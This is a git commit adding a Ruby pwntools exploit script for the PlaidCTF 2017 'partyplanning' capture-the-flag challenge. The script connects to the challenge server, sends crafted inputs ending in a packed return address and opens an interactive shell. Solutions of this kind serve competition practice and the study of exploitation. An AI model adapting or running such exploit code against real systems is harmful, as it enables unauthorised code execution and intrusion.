1587a13a8162e140b8132a5233ed231d1310e63a
david942j <david942j@users.noreply.github.com>
2017-04-24 05:35:37 +0800

    Create partyplanning.rb

---
+++ plaidctf-2017/partyplanning/partyplanning.rb
@@ -0,0 +1,32 @@
+#!/usr/bin/env ruby
+# encoding: ascii-8bit
+require 'pry'
+require 'pwn'        # https://github.com/peter50216/ruby-pwntools
+
+host, port = 'partyplanning.chal.pwning.xxx', 3291
+@local = false
+if ARGV.empty?
+  host = '127.0.0.1'; @local = true
+else
+  raise ArgumentError, 'host not set' if host.empty?
+end
+$z = Sock.new host, port
+def z;$z;end
+#================= Exploit Start ====================
+
+z.puts '401457'
+z.puts '401335'
+z.puts 'meow'
+z.puts 'jiao'
+z.puts 'lNHRHu' # hash 0x604218
+z.puts 'QQpie'
+z.puts 'WWWW'
+z.puts 'pop'
+z.puts 'foooood~'
+z.puts '' # important
+z.recvuntil('[y/N]')
+sleep(2)
+# z.write 'AAAA'
+z.puts p32(0x402642)[0,3]
+p 'shell!'
+z.interact
